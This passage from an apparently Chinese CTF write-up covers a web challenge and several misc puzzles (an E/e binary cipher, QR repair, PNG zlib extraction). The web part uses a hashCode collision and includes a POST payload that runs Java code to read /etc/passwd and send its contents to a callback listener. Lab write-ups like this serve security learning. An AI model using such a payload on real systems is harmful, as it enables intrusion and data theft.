<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="string">&quot;guanzhujiarandundunjiechan&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> secret.hashCode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dic</span> <span class="operator">=</span> <span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> i : dic.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> j : dic.toCharArray()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> + i + j + secret.substring(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp.hashCode() == hash) &#123;</span><br><span class="line">                    System.out.println(tmp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没网，不知道为啥反射不了，打的代码执行，读文件然后请求回带。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /exp</span><br><span class="line"></span><br><span class="line">&#123;&quot;x&quot;:&quot;i7anzhujiarandundunjiechan&quot;,&quot;cmd&quot;:&quot;java.util.Scanner scanner = new java.util.Scanner(new java.io.File(\&quot;/etc/passwd\&quot;));scanner.nextLine();java.net.URL url = new java.net.URL(\&quot;http://127.0.0.1:2333/\&quot;);java.net.HttpURLConnection httpURLConnection =(java.net.HttpURLConnection) url.openConnection();httpURLConnection.setRequestProperty(\&quot;Content-Type\&quot;, scanner.nextLine());httpURLConnection.getInputStream();&quot;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc">Misc</h1>
<h2 id="misc_奇怪的e">misc_奇怪的E</h2>
<p>零宽编码解密得到压缩包密码<strong>Cetacean</strong>。</p>
<p>发现文本里只有<strong>E</strong>和<strong>e</strong>，而且是<strong>8</strong>的倍数，尝试转换为<strong>0</strong>和<strong>1</strong>，然后转字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">original = <span class="string">&quot;EEEEEEEEEeeEEeeEEEEEEEEEEeeEeeEEEEEEEEEEEeeEEEEeEEEEEEEEEeeEEeeeEEEEEEEEEeeeeEeeEEEEEEEEEeEEEEeeEEEEEEEEEeeEEeEeEEEEEEEEEeeeEeEEEEEEEEEEEeeEEEEeEEEEEEEEEeeEEEeeEEEEEEEEEEeeEeEEEEEEEEEEEeeEEEEeEEEEEEEEEeeEeeeEEEEEEEEEEeEeeeeeEEEEEEEEEeEEEEeeEEEEEEEEEEeeEEEeEEEEEEEEEeeeEEEEEEEEEEEEEeeEeEEEEEEEEEEEEeeEEeEeEEEEEEEEEeeeEEeEEEEEEEEEEeEeeeeeEEEEEEEEEEeeEEEeEEEEEEEEEeeeEEeeEEEEEEEEEeEeeeeeEEEEEEEEEeeEEEEeEEEEEEEEEeEeeeeeEEEEEEEEEeeEEeeeEEEEEEEEEEeeEEEEEEEEEEEEEeeEeeeeEEEEEEEEEeeEEeEEEEEEEEEEEeEeeeeeEEEEEEEEEeeEEeEeEEEEEEEEEeEEeeeEEEEEEEEEEeeEEEeeEEEEEEEEEEeeEEEEEEEEEEEEEeeEEeEEEEEEEEEEEeeEEeEeEEEEEEEEEEeEEEEeEEEEEEEEEEeEEEEeEEEEEEEEEEeEEEEeEEEEEEEEEEeEEEEeEEEEEEEEEeeeeeEe&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> original:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">        res += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">        res += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&quot;0b&quot;</span> + res, <span class="number">2</span>)).decode().replace(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"><span class="comment"># flag&#123;Cetac4an_C1pher_1s_a_g0od_eNc0de!!!!&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="misc_bit_qr">misc_Bit_QR</h2>
<p>修一下二维码的定位，扫到了<strong>457c</strong>。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAAGQCAYAAACAvzbMAAAAAXNSR0IArs4c6QAAAFBlWElmTU0AKgAAAAgAAgESAAMAAAABAAEAAIdpAAQAAAABAAAAJgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAABkKADAAQAAAABAAABkAAAAAAJ7EHSAAABWWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNi4wLjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgoZXuEHAAAhCklEQVR4Ae3d249eVf0/8AW0nMqxQClQJKAghxIBxRAUjyieUOTCaEz0xhjxwsOtV7+/wMQ7Y6Je6I03Jl6o0XhBCAgoCoUIlgq1HIutnFpKW9ry62f7ndKhp5n5PNO117NeTzKZ6cyznr0+r8+evmcfnr2PKaW8uffDYwQCS5cuLddcc0358pe/XG644YZy6aWXltNOO60cf/zx5ZhjjhnBDE2BAAECbwkct/fL//fWP31VU2DPnj3lueeeK3fddVd55JFHyuuvv17efPPNcsoppwwhctxx0S4PAgQIjENAgIyjD7NmsWvXrvLMM8+Uu+++u6xZs6bs3LlzCJGTTz65xFbKscceO+v5/kGAAIEaAgKkhvoclxlBElsk9913X1m7du0QHKeeemo58cQThyCxW2uOkJ5GgMCiCAiQRWGd7IvGFsj69evLPffcU55//vly0kknDcdGTjjhhGK31mStvRoBAnMXECBzt6r+zDgm8uijj5b7779/OD4SWyMzx0dsjVRvjwkQ6E5AgDTW8jjQ/tJLL5UHHnigPPzww8OurOXLlw9BYmuksWaaLoHGBQRIow2M4yPPPvtsefDBB8u2bdvKmWee6ZTfRntp2gRaFRAgrXZu77zjFN9XX311OOV3w4YN5YwzzijnnXdeiWMjdmk13FhTJ9CIgABppFGHm2YcZH/66afLk08+OYTH2WefXZYtW+YA++HQ/IwAgbSAAEkTjuMFZk75/etf/1q2b99eLrroouG4SLxvxIMAAQKLISBAFkO10mvGLq2tW7eWxx57rGzatKmcc845ZcWKFWXJkiV2aVXqicUSmGYBATKF3Y0tkCeeeKJs3LixvOMd7yhxlla8+dCDAAECkxQQIJPUHNFrxXGReBd7HBuJM7QuuOACF2UcUX9MhcA0CAiQaejiIWqIEHnqqafKunXryrnnnltWrlw5vIvdGVqHAPNtAgTmJSBA5sXV3pN37949HA95/PHHy/nnnz9sicTuLCHSXi/NmMDYBJZkJxQHbj0IECBAoD8B1wXvr+cqJkCAwEQEBMhEGL0IAQIE+hMQIP31XMUECBCYiIAAmQijFyFAgEB/AgKkv56rmAABAhMRECATYfQiBAgQ6E9AgPTXcxUTIEBgIgICZCKMXoQAAQL9CQiQ/nquYgIECExEQIBMhNGLECBAoD8BAdJfz1VMgACBiQgIkIkwehECBAj0JyBA+uu5igkQIDARAQEyEUYvQoAAgf4EBEh/PVcxAQIEJiKQvh9IdhZubJQVrDs+ez+YbP9rL7+ufim911/bv/bys/3Pzt8WSFbQeAIECHQqIEA6bbyyCRAgkBUQIFlB4wkQINCpgADptPHKJkCAQFZAgGQFjSdAgECnAgKk08YrmwABAlkBAZIVNJ4AAQKdCgiQThuvbAIECGQFBEhW0HgCBAh0KiBAOm28sgkQIJAVECBZQeMJECDQqYAA6bTxyiZAgEBWQIBkBY0nQIBApwICpNPGK5sAAQJZAQGSFTSeAAECnQpUvx9I1r329fCz8689Pns/juz8s/3Lzr/15Wf9s+Ozftnltz4+u/7Wrt8WSO0OWD4BAgQaFRAgjTbOtAkQIFBbQIDU7oDlEyBAoFEBAdJo40ybAAECtQUESO0OWD4BAgQaFRAgjTbOtAkQIFBbQIDU7oDlEyBAoFEBAdJo40ybAAECtQUESO0OWD4BAgQaFRAgjTbOtAkQIFBbQIDU7oDlEyBAoFEBAdJo40ybAAECtQUESO0OdL783bt3dy6gfALtCgiQdns3FTPfvHnzVNShCAI9CgiQHrs+opofffTRsmvXrhHNyFQIEJirQPP3A5lroYd6XuvX42/9fgx/+tOfyurVq8s555xzqBaN+vut+9fG9ftXuwO55dsCyfkZnRT4wx/+UNatW1ccC0lCGk6ggoAAqYBukW8JrF+/vtx1113l1VdffeubviJAoAkBAdJEm6Z3klu3bi2/+93vyoYNG8qePXumt1CVEZhCAQEyhU1tqaQ33nijrF27tvzlL38pO3bsaGnq5kqgewEB0v0qUBcgDkJv2bKl/P73vy+bNm2qOxlLJ0BgXgICZF5cnrwYArHlsWbNmvLYY485pXcxgL0mgUUSECCLBOtl5y4Qxz5efvnlcu+995bXXntt7gM9kwCBqgICpCq/hc8IRHDceeed5bnnniveWzGj4jOBcQsIkHH3p5vZxcH0f/3rX8U707tpuUKnQECATEETp6GE2OqIrZA4G8turGnoqBp6EBAgPXS5kRq3bdtW7r//fmdjNdIv0yQgQKwDoxGIiyo+9dRT5YknnnBpk9F0xUQIHFpAgBzaxk+OskCcjfXKK6+Uhx56yJsKj7K9xRFYiIAAWYiaMYsmsH379uE9IREkHgQIjFtAgIy7P93NbufOncMbCjdu3Nhd7Qom0JrAMXsn/GZm0tlz9rP3A6i9/IzdJMbWrr/28rOG2flnl9/6+p/1y9af9c+Or11/dvnZ+m2BZAWNJ0CAQKcCAqTTxiubAAECWQEBkhU0ngABAp0KCJBOG69sAgQIZAUESFbQeAIECHQqIEA6bbyyCRAgkBUQIFlB4wkQINCpgADptPHKJkCAQFZAgGQFjSdAgECnAgKk08YrmwABAlkBAZIVNJ4AAQKdCgiQThuvbAIECGQFBEhW0HgCBAh0KiBAOm28sgkQIJAVECBZQeMJECDQqYAA6bTxLZR93nnnld/85jcl7pUe9z1YjI+4H0XNj2xNLfTRHKdXQIBMb2+norK4T7oHAQLjFBAg4+yLWREgQGD0AgJk9C3qe4LHHmsV7XsNUP2YBfx2jrk7nc8tjg8cd9xxnSson8B4BQTIeHvT/cx2795djj/++OEgd/cYAAiMUECAjLAppvQ/gTiAHruw4iwpDwIExicgQMbXEzP6P4Ht27eX+PAgQGCcAgJknH0xq70CO3fuLM8991xxKq/VgcA4BQTIOPtiVnsFIjiefPLJ8sYbb/AgQGCEAgJkhE0xpf8JxFlY9913X9m8eTMSAgRGKCBARtgUU/qfQARIbIE8++yzSAgQGKGAABlhU0zpLYFXXnmlPPDAA2XHjh1vfdNXBAiMQkCAjKINJnEwgdgCiQPpa9asKdu2bTvYU3yPAIGKAgKkIr5FH1kgDqDHFsgLL7xw5Cd7BgECR1VAgBxVbgubr0CciRWn8sZxkNgi8SBAYDwCS0466aThzVq9/nL2Wvd4VsHDzyT6E28mfOKJJ8pNN900XNrk8COO7k+tPzlvfjm/2qOPvfXWW8vFF188ul/M2jCWPw6B+A8mdmM9+OCD5bXXXhvHpMyCAIFB4Ngf/OAH5Y477igf/ehHy8qVK8uSJUvQEBiVQNyRMLZABMio2mIyBMqSq6++ulx44YXl+uuvL3/84x+HA5bx1168ecvmpTVkDAJxVd7169eXl156qaxatWoMUzIHAgT2CiyJq50uX7683HjjjeWyyy4ra9euLT/96U+He1Fv3bpViFhNqgvEHzLxfpBnnnmmrF692tV5q3fEBAj8T2DfWVhLly4ddmFde+215aqrriqnnXaa8LCWjEJg5jjI888/X2J3lgcBAuMQ2BcgMZ2470L8gm7atMk7f8fRH7PYKxABErux4nReAWKVIDAegVkBEtOKA5VPP/20A5bj6ZGZ7BWIANmwYYMr81obCIxIYFaAxF96//3vf4d3/cYlJDwIjEUgAiTeje6SJmPpiHkQKGVWgMS7fmP31ZYtW9zEx9oxKoFYNyNA3KFwVG0xmc4FZgVI/JUXAfL66687gN75ijG28mPrOHavxrrpQYDAOAQOCJCNGzfaTTCO3pjFfgIzAeLNhPuh+JJAZYFZARLHPWILxG6Cyl2x+AMEIkBivbR1fACNbxCoJjArQOKmPfEOdAFSrR8WfAiBCJDYxRrraHztQYBAfYEDAiTe8RsXr/MgMDaBOJAef9wIkLF1xnx6FdgXIPFLGbsH4jTJ+EvPg8DYBGId9cfN2LpiPj0LzLr0buweaC1A4t3zHtMvEOHx4osvlttvv31Wsa1vjWTX39r1Z+c/q5n+0ZzAvi2QmHkcRI+/8GqvlM0pmjABAgQ6FNgXIBEaESCx+0qAdLgmKJkAAQLzFNgXIDEutj5crG6egp5OgACBTgVmBcjM1octkE7XBmUTIEBgHgL7AiRCY+ZjHuM9lQABAgQ6FdgXIJ3Wr2wCBAgQWKDAvgCJ0/Hi9rZOy1ugpGEECBDoTGBfgETdxx133PAhRDpbC5RLgACBBQjMCpDjjz9+CJAFvI4hBAgQINCZwL4Aia2OCJAlS5bYjdXZSqBcAgQILERgVoCccMIJJT5iV5YHAQIECBA4nMC+AIknRXicdNJJw8H0ww3yMwIECBAgMCtATjzxxHLKKafYArFeECBAgMARBWYFSGyBnHHGGcOWyBFHegIBAgQIdC0wK0DiIPrZZ58tQLpeJRRPgACBuQnMuh9IBMjKlSvLySefPLfRE3iW625NAHHKX2Lp0qXlwx/+cPnZz35WLrzwwolW2/v613v9E12ZOnyxWVsgcQrvihUrhgPpHVooeaQCsV6+853vLMuWLRvpDE2LQJ8CswIkLmUSu7BiC8S70ftcIcZYdWyBXHvttQJkjM0xp64FDgiQ2AKJA+neC9L1ejGa4uMPmTg78JJLLikRJB4ECIxHYFaAxLQiPM4//3y7scbTo65nElvF5513Xlm1apX3J3W9Jih+jAIHBEjsZ44DlfY3j7Fd/c0pTux43/veV84999z+ilcxgZELHBAgsbvg0ksvLaeffvrIp256PQjEbqtrrrnmqJ4Z2IOrGglMQuCAAIlf2IsvvnjYlRW7DzwI1BKI9e/MM88s733ve703qVYTLJfAYQQOSIj4pY3dBXEw3UHLw8j50aILxOm7l1122bBL1VmBi85tAQTmLXBAgMQrnHXWWeXyyy+3G2venAZMUiAurXPzzTcP6+MkX9drESAwGYGDBkgcQL/iiiuG3ViTWYxXITA/gZnTd+P9H3Eg3YMAgfEJHDRAYtdVBEjsyordCB4EjrZArIPXX399ueqqq7wn6WjjWx6BOQocNEDiTYRx3n0cTD+a18Wa45w9rQOBOBvwc5/7nK3gDnqtxHYFDhogUc7M2S/Lly9vtzozb1IgTuSIN7TG7qu4wZkHAQLjFDhkgMRfgKtXrx6ujeV03nE2b1pnNXPwPM7AcvbVtHZZXdMgcMgAid1Y73rXu8qVV17pXenT0OlGaojAiK2O2267rZx66qmNzNo0CfQpcNgj5HE67wc+8IHy5z//uWzZsuWgQv5CPCiLby5QIO5P8eKLL5bPf/7zC3yFtoZl78eR/f3LLr+2duv1tz7/Q26BxIoRfwm+5z3vGS5m52ys2r8qlk+AAIFxCRw2QOLYR5yJFZeSiIOaHgQIECBAYEbgsAEST4rgiNuJxiXes5tbMwv1mQABAgTaFzhigMQbuuJsrKuvvtpBzfb7rQICBAhMTOCIARJbHStXrhyuSRQ39vEgQIAAAQIhcMQAiSfFu9Hjpj5xeRPvTA8RDwIECBCYU4DEwfS4S+EnPvGJ4YwsbAQIECBAYE4BEkynnHJKueGGG8q73/3uEu9S9yBAgACBvgXmHCDxzvRLLrmkfPKTn7QV0vc6M7HqXSJnYpReiEAVgTkHSMzutNNOKx/72MeG4yGxReJBICPgeFpGz1gC9QXmFSDxF2Nshdx6661uM1q/d03PIK5sEKeHexAg0K7AvAIkyoy/Gj/4wQ+Wj3zkI8Ml39st3cxrCcSp4XGdtW9/+9u1pmC5BAhMQGDeARK//PF+kLjYXVxu2zWyJtCFzl4i/gj52te+NhxP66x05RKYKoF5B0hUH/druO6668qnPvWp4ba3UyWimEUViPub33jjjeXrX/96WbFixaIuy4sTILC4AgsKkNgKiTsVfuYzn3HXuMXtz1S9+sxxj+985zvDvWZiPfIgQKBdgWP23g/gzYVOP+4R8qtf/ar88Ic/LI8//njZvXv3Ql/KOAJVBBKrf5X5vn2hrYdw6/5v70dv/z7sDaWOhBGn8sZpvWvXri0vvfRS2bhx45GG+DkBAgQITInAgnZhzdQef/2sWrWq3H777cO71L03ZEbGZwIECEy/QCpAgicOisb5/F/60peGuxfGXQw9CBAgQGD6BVK7sGZ4ZnZlvfzyy2Xz5s1l3bp1Zc+ePTM/9pkAAQIEplAgvQUSJrEr65xzzhlO6/3sZz87fD2FVkoiQIAAgf0EJhIg8XpxmZMLLrigfPWrXy233HKLd6nvh+xLAgQITKPAxAIkcOJ4yJVXXlm+8pWvDAfVly1bNo1maiJAgACBvQITOQayv2TcKyTuG7Jjx47hOMjdd99dXnvttf2f4msCBAgQmAKBiQdImJx++unlQx/60BAc8f6Qhx56qOzcuXMKuJRAgAABAjMCE92FNfOicVD9jDPOKDfffHP55je/OezWWrp06cyPfSZAgACBKRBYlC2QcJk5M+vTn/70sPXx85//vDz88MPDrq0pcFMCAQIEuhdYlC2QGdUIkXPPPbfcdttt5Rvf+Ea54oorii2RGZ32P8fxLg8CBPoVWNQACda4l3qESFy591vf+tbwrvU4W8ujXYH4wyCOc91xxx3tFmHmBAikBVJX453P0uNKvZs2bSq//e1vyy9/+cvywAMPlK1bt87nJTx3BAIzl2T//ve/P7zfZ+XKlSOY1cKn0PrVYCPMW3607t+y/STmftQCJCYbK0uESJza+5Of/GT47BTfSbTx6LxGbDnG7Yy/973vlY9//OPD7Y39B3Z07A+1FP6HkvH9oyFwVAMkCooQeeWVV8qdd95ZfvGLX5Rf//rXR6NOyyBwUIHsX8C9/weerT/rf9CmzuObrc9/HqUuylOPeoBEFbHSvPrqq+WRRx4pN91006IU5kUJzEUg+x9Y9j+gucxxMZ9Tu/7s8rM22f7Vnn+2/uz4KgEyM+nt27cXl3+f0fC5hkD2P4Dsf0A1at5/mbXrzy5//1oW8nW2f7Xnv5CaJzlm0c/COtxknQZ6OB0/I0CAwLgFqgbIuGnMjgABAgQOJyBADqfjZwQIECBwSAEBckia6f+BqwJMf49VSGAxBQTIYuqO8LXjoGEce4oLXf74xz8e4QxNiQCBVgSqnoUVSNmzIFqBrj3PuGPk8uXLh9sOf/GLXyxXX311WbVq1fBmwNpzq7n87Fk0ra+/tevPLj+77mT7V3v+2fqz4xftarzZiRmfF4hfjjhNOm7w9YUvfKFcd9115fLLLy+nnnpqOeGEE/IL8AoECHQt0HyAnHzyyWXbtm1dN3H/4mNLIwLiqquuGrY2IjRWr15dzjrrrGFrI37uQYAAgUkINB8g3/3ud4draq1Zs6Zs2bJleJf7JGBaeY3YyogrHq9YsaK8//3vH7Y2YovjoosuKmefffawBRI/9yBAgMCkBZo/BrJhw4by6KOPlr///e/l3nvvHa7yu3nz5rJr165JW43y9eKquDO7piI0li1bNhwkn+uWRnYf8ChR5jGp7D7s1v1q159d/jxafdCnZvtXe/4HLeoofrP5ANmzZ0+JS6LEBRr//e9/l9gS+cc//lH+9re/DZ9jqySeM62PqDuOcyz0lNzsL1Drrtn/AFr3q11/dvnZ9S/bv9rzz9afHd98gMw0MD7HPUfiHiOxBfLkk08OYfLPf/5z+Lx+/frhAo7TtmUyU/9CV4TsL9BClzuWcb371a4/u/zsepRd/2vPP1t/dvzUBMj+ELHF8cYbbwyBEWES4RGB8thjj5V169YNHy+88MJwf/bWt06yK3D2F2h/9xa/7t2vdv3Z5WfXuez6X3v+2fqz45sPkCzALbfcUp555pmycePGfVsoPa0U2Vqzv4DZ/rU+Puufrb/3/mX9s37Z5Wf7nx3ffYDcc8895T//+U+JLZLnn39+uGNibLXE91588cXy8ssvl7hrYhxnia2a2E0WTZ/5yDag9vjsCpz9Bapdf+3lZ/2z8++9f1n/rF92+dn+Z8d3HyARCnFcZMeOHeX1118fwiIOvMcNr+IjDlJHgMRHvN8knrdz5859YfKjH/0o24Oq47MrcPYXqGrxI1h41j9bQu/9y/pn/bLLz/Y/O777AHl7A+PfcVxk5iO2OCJgZj7i+/H1zJbIxRdfnO1B1fFvr3++k8n+As13edP2/Kx/1qP3/mX9s37Z5Wf7nx3f/BsJswBvHx8rRLzx7khvvmu98W+v278JECAwXwEBMl+x/3t+9i+PBS7WMAIECIxGwIWRRtMKEyFAgEBbAgKkrX6ZLQECBEYjIEBG0woTIUCAQFsCAqStfpktAQIERiMgQEbTChMhQIBAWwICpK1+mS0BAgRGIyBARtMKEyFAgEBbAgKkrX6ZLQECBEYjIEBG0woTIUCAQFsCAqStfpktAQIERiPQ/aVMspckyV4Tq/fl1/5NaN0/69f6+putP9v/7PJbH28LpPUOmj8BAgQqCQiQSvAWS4AAgdYFBEjrHTR/AgQIVBIQIJXgLZYAAQKtCwiQ1jto/gQIEKgkIEAqwVssAQIEWhcQIK130PwJECBQSUCAVIK3WAIECLQuIEBa76D5EyBAoJKAAKkEb7EECBBoXUCAtN5B8ydAgEAlAQFSCd5iCRAg0LqAAGm9g+ZPgACBSgICpBK8xRIgQKB1AQHSegfNnwABApUEjtl7P4A3Ky3bYgmU2vdj6H31z/rX9mt9/q3/F2ALpPUOmj8BAgQqCQiQSvAWS4AAgdYFBEjrHTR/AgQIVBIQIJXgLZYAAQKtCwiQ1jto/gQIEKgkIEAqwVssAQIEWhcQIK130PwJECBQSUCAVIK3WAIECLQuIEBa76D5EyBAoJKAAKkEb7EECBBoXUCAtN5B8ydAgEAlAQFSCd5iCRAg0LqAAGm9g+ZPgACBSgICpBK8xRIgQKB1AQHSegfNnwABApUEllRa7r7FZq/nv++FfFFFIHs/iOz4bNHZ9a/2/LP11x6f9c/Ov/byW19/bIFk10DjCRAg0KmAAOm08comQIBAVkCAZAWNJ0CAQKcCAqTTxiubAAECWQEBkhU0ngABAp0KCJBOG69sAgQIZAUESFbQeAIECHQqIEA6bbyyCRAgkBUQIFlB4wkQINCpgADptPHKJkCAQFZAgGQFjSdAgECnAgKk08YrmwABAlkBAZIVNJ4AAQKdCgiQThuvbAIECGQFBEhW0HgCBAh0KlD9fiBZ99avp5+tPzu+9v0Qai+/db/s+p8dn/Wrvfzs/Ftff7P12wLJChpPgACBTgUESKeNVzYBAgSyAgIkK2g8AQIEOhUQIJ02XtkECBDICgiQrKDxBAgQ6FRAgHTaeGUTIEAgKyBAsoLGEyBAoFMBAdJp45VNgACBrIAAyQoaT4AAgU4FBEinjVc2AQIEsgICJCtoPAECBDoVECCdNl7ZBAgQyAoIkKyg8QQIEOhUQIB02nhlEyBAICsgQLKCxhMgQKBTgebvB5LtW+vX82/9fgrZ/tWuv/b6U3v5Wf/s/LPLr73+tV6/LZDsGmQ8AQIEOhUQIJ02XtkECBDICgiQrKDxBAgQ6FRAgHTaeGUTIEAgKyBAsoLGEyBAoFMBAdJp45VNgACBrIAAyQoaT4AAgU4FBEinjVc2AQIEsgICJCtoPAECBDoVECCdNl7ZBAgQyAoIkKyg8QQIEOhUQIB02nhlEyBAICsgQLKCxhMgQKBTAQHSaeOVTYAAgayAAMkKGk+AAIFOBbq/H0infR9N2bXv55C9H8NoIBc4kax/1s/y31xg58YxzBbIOPpgFgQIEGhOQIA01zITJkCAwDgEBMg4+mAWBAgQaE5AgDTXMhMmQIDAOAQEyDj6YBYECBBoTkCANNcyEyZAgMA4BATIOPpgFgQIEGhOQIA01zITJkCAwDgEBMg4+mAWBAgQaE5AgDTXMhMmQIDAOAQEyDj6YBYECBBoTkCANNcyEyZAgMA4BATIOPpgFgQIEGhOQIA01zITJkCAwDgEBMg4+mAWBAgQaE7A/UCaa9l0Tbj2/SSymr3fzyLr1/r41vuf9bcFkhU0ngABAp0KCJBOG69sAgQIZAUESFbQeAIECHQqIEA6bbyyCRAgkBUQIFlB4wkQINCpgADptPHKJkCAQFZAgGQFjSdAgECnAgKk08YrmwABAlkBAZIVNJ4AAQKdCgiQThuvbAIECGQFBEhW0HgCBAh0KiBAOm28sgkQIJAVECBZQeMJECDQqYAA6bTxyiZAgEBWQIBkBY0nQIBApwLd3w8kez3/TtebiZXdur/7mRyTWheyfqmFj2Bw6+u/LZARrESmQIAAgRYFBEiLXTNnAgQIjEBAgIygCaZAgACBFgUESItdM2cCBAiMQECAjKAJpkCAAIEWBQRIi10zZwIECIxAQICMoAmmQIAAgRYFBEiLXTNnAgQIjEBAgIygCaZAgACBFgUESItdM2cCBAiMQECAjKAJpkCAAIEWBQRIi10zZwIECIxAQICMoAmmQIAAgRYFBEiLXTNnAgQIjEBAgIygCaZAgACBFgWavx9I7/cTaHGlG9Ocs/djyK5/2fG155/tZXb+2eW37l/bzxZIdg00ngABAp0KCJBOG69sAgQIZAUESFbQeAIECHQqIEA6bbyyCRAgkBUQIFlB4wkQINCpgADptPHKJkCAQFZAgGQFjSdAgECnAgKk08YrmwABAlkBAZIVNJ4AAQKdCgiQThuvbAIECGQFBEhW0HgCBAh0KiBAOm28sgkQIJAVECBZQeMJECDQqYAA6bTxyiZAgEBWQIBkBY0nQIBApwLH7L2e/Jud1q5sAgQIEEgI2AJJ4BlKgACBngUESM/dVzsBAgQSAgIkgWcoAQIEehYQID13X+0ECBBICAiQBJ6hBAgQ6FlAgPTcfbUTIEAgISBAEniGEiBAoGcBAdJz99VOgACBhIAASeAZSoAAgZ4FBEjP3Vc7AQIEEgICJIFnKAECBHoWECA9d1/tBAgQSAgIkASeoQQIEOhZQID03H21EyBAICEgQBJ4hhIgQKBnAQHSc/fVToAAgYSAAEngGUqAAIGeBQRIz91XOwECBBICAiSBZygBAgR6FhAgPXdf7QQIEEgICJAEnqEECBDoWUCA9Nx9tRMgQCAhIEASeIYSIECgZwEB0nP31U6AAIGEgABJ4BlKgACBngUESM/dVzsBAgQSAgIkgWcoAQIEehYQID13X+0ECBBICAiQBJ6hBAgQ6FlAgPTcfbUTIEAgISBAEniGEiBAoGeB/w/O8WdH6sNo7QAAAABJRU5ErkJggg=="></p>
<p>然后藏了个没头的<strong>PNG</strong>。</p>
<figure>
<img src="/images/2022-CPIPC-Preliminary/1.png" alt="1" />
<figcaption aria-hidden="true">1</figcaption>
</figure>
<p>补齐后扫到<strong>flag{fcc73648-a3dd-????-8b</strong>，猜测<strong>????</strong>是填上<strong>457c</strong>，还差后半段。</p>
<figure>
<img src="/images/2022-CPIPC-Preliminary/2.png" alt="2" />
<figcaption aria-hidden="true">2</figcaption>
</figure>
<p>还有第二块<strong>IDAT</strong>。</p>
<figure>
<img src="/images/2022-CPIPC-Preliminary/3.png" alt="3" />
<figcaption aria-hidden="true">3</figcaption>
</figure>
<p>解一下<strong>zlib</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;78 9C 0D C8 41 11 00 31 08 03 40 4B 90 A4 94 93</span></span><br><span class="line"><span class="string">73 03 F5 6F 01 1E FB 59 C1 42 71 D0 14 9D 27 16</span></span><br><span class="line"><span class="string">B1 B8 0B 1A F3 B6 BD F2 BC 05 7C A5 D6 2F 0D 2C</span></span><br><span class="line"><span class="string">65 0C 02 00 00 00 00 49 45 4E 44 AE 42 60 82 4E</span></span><br><span class="line"><span class="string">47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 00 00 01</span></span><br><span class="line"><span class="string">90 00 00 01 90 08 02 00 00 00 0F DD A1 9B 00 00</span></span><br><span class="line"><span class="string">08 C6 49 44 41 54 78 9C ED DD CB 72 1B 39 10 00</span></span><br><span class="line"><span class="string">41 72 C3 FF FF CB DE A3 6F 04 23 20 3C 6A 94 79</span></span><br><span class="line"><span class="string">5E 4B 20 45 56 E0 30 BD FD FE FB F7 EF 0B A0 E0</span></span><br><span class="line"><span class="string">BF D3 07 00 F8 96 60 01 19 82 05 64 08 16 90 21</span></span><br><span class="line"><span class="string">58 40 86 60 01 19 82 05 64 08 16 90 21 58 40 86</span></span><br><span class="line"><span class="string">60 01 19 82 05 64 08 16 90 21 58 40 86 60 01 19</span></span><br><span class="line"><span class="string">82 05 64 08 16 90 21 58 40 86 60 01 19 82 05 64</span></span><br><span class="line"><span class="string">08 16 90 F1 67 F2 DF BF DF EF 1F 39 C7 CD 86 7B</span></span><br><span class="line"><span class="string">3A 3E BF 09 F3 6B 3E E6 DF E4 D5 AB 46 36 9C F0</span></span><br><span class="line"><span class="string">F1 6F B2 AF D2 37 DC B0 80 0C C1 02 32 04 0B C8</span></span><br><span class="line"><span class="string">10 2C 20 43 B0 